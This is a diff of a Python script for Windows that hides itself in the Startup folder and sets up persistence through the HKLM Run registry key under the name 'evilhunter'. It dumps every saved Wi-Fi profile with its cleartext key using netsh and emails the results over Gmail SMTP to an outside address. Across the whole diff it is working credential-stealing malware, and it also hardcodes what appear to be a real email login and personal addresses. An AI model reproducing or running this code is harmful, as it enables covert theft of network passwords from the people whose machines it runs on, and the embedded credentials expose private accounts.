@@ -48,101 +48,78 @@ def move_and_hide_in_startup():
 
         # Relaunch the script/executable from the new location
         subprocess.Popen([destination], shell=True)
-        return True  # Indicate that the script has been moved and relaunched
+        return destination  # Return the new path where the script was moved
 
-    return False  # Indicate that the script is already in the correct location
+    return None  # Indicate that the script is already in the correct location
 
 # Function to add the script to the Windows Registry for startup
-def add_to_registry():
-    # Use HKEY_CURRENT_USER for current user or HKEY_LOCAL_MACHINE for all users
-    key = reg.HKEY_LOCAL_MACHINE # or reg.HKEY_LOCAL_MACHINE
-
-    # Path to the "Run" key in the registry
-    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
-    # Name for the registry entry
-    entry_name = "MyProgram"
-
-    # Detect if running as an executable created by PyInstaller
-    if getattr(sys, 'frozen', False):
-        executable_path = sys.executable  # Path to the executable
-    else:
-        executable_path = os.path.abspath(__file__)  # Path to the script
+def add_to_registry(executable_path):
+    key = reg.HKEY_LOCAL_MACHINE  # or reg.HKEY_LOCAL_MACHINE
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    entry_name = "evilhunter"
 
     try:
-        # Open the registry key where you want to add your program
         reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)
-
-        # Set the value in the registry
         reg.SetValueEx(reg_key, entry_name, 0, reg.REG_SZ, executable_path)
-        
-        # Close the registry key
         reg.CloseKey(reg_key)
-
         print(f"{entry_name} added to the registry successfully!")
-
     except WindowsError as e:
         print(f"Failed to add {entry_name} to the registry: {e}")
 
-# Move and hide the script in the Startup folder if it's not already there
-if move_and_hide_in_startup():
-    # If the script was moved and relaunched, exit the original instance
-    sys.exit()
+# Function to send an email with the collected Wi-Fi passwords
+def send_email(wifi_data_str):
+    sender_email = "gagan.21cse219@rtu.ac.in"
+    sender_password = "12345gaganjha"  # Use your App Password or regular password if 2FA is not enabled
+    receiver_email = "gjha20367@gmail.com"
+    subject = "Wi-Fi Passwords"
 
-# Add the script to the Windows Registry for startup
-add_to_registry()
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(f"Here are the Wi-Fi profiles and their passwords:\n\n{wifi_data_str}", 'plain'))
 
-# The script will continue from here after being moved to the Startup folder
+    try:
+        # Establish a connection to the SMTP server
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.ehlo()  # Can be called explicitly, though it's implicitly called by starttls
+        server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
+        server.ehlo()  # Called again to re-identify after starting TLS
+        server.login(sender_email, sender_password)
+        
+        # Send the email
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+    finally:
+        server.quit()
 
-# Wait until an internet connection is established
-while not check_internet():
-    print("Waiting for internet connection...")
-    time.sleep(5)  # Wait for 5 seconds before checking again
+# Main script logic
+def main():
+    moved_path = move_and_hide_in_startup()
+    
+    if moved_path:
+        add_to_registry(moved_path)  # Use the new path for the registry entry
+        sys.exit()
 
-print("Internet connection established. Proceeding...")
+    while not check_internet():
+        print("Waiting for internet connection...")
+        time.sleep(2)
 
-# Get the list of all Wi-Fi profiles
-profiles_output = run_command("netsh wlan show profile")
-profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
+    print("Internet connection established. Proceeding...")
 
-# Dictionary to store the Wi-Fi profiles and their passwords
-wifi_dict = {}
+    profiles_output = run_command("netsh wlan show profile")
+    profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
 
-# Collect passwords for each profile
-for profile in profiles:
-    command = f"netsh wlan show profile name=\"{profile}\" key=clear"
-    profile_output = run_command(command)
-    password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
-    wifi_dict[profile] = password_line[0] if password_line else "No password found"
+    wifi_dict = {}
+    for profile in profiles:
+        profile_output = run_command(f"netsh wlan show profile name=\"{profile}\" key=clear")
+        password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
+        wifi_dict[profile] = password_line[0] if password_line else "No password found"
 
-# Convert the dictionary to a JSON string
-wifi_data_str = json.dumps(wifi_dict, indent=4)
+    wifi_data_str = json.dumps(wifi_dict, indent=4)
+    send_email(wifi_data_str)
 
-# Email details
-sender_email = "youremailID@email.com"
-sender_password = "your-password"  # Use your App Password or regular password if 2FA is not enabled
-receiver_email = "client-email-id@email.com"
-subject = "Wi-Fi Passwords"
-
-# Create the email
-msg = MIMEMultipart()
-msg['From'] = sender_email
-msg['To'] = receiver_email
-msg['Subject'] = subject
-
-# Attach the dictionary data as the body of the email
-body = f"Here are the Wi-Fi profiles and their passwords:\n\n{wifi_data_str}"
-msg.attach(MIMEText(body, 'plain'))
-
-# Send the email
-try:
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(sender_email, sender_password)
-    text = msg.as_string()
-    server.sendmail(sender_email, receiver_email, text)
-    print("Email sent successfully!")
-except Exception as e:
-    print(f"Failed to send email: {e}")
-finally:
-    server.quit()
+if __name__ == "__main__":
+    main()
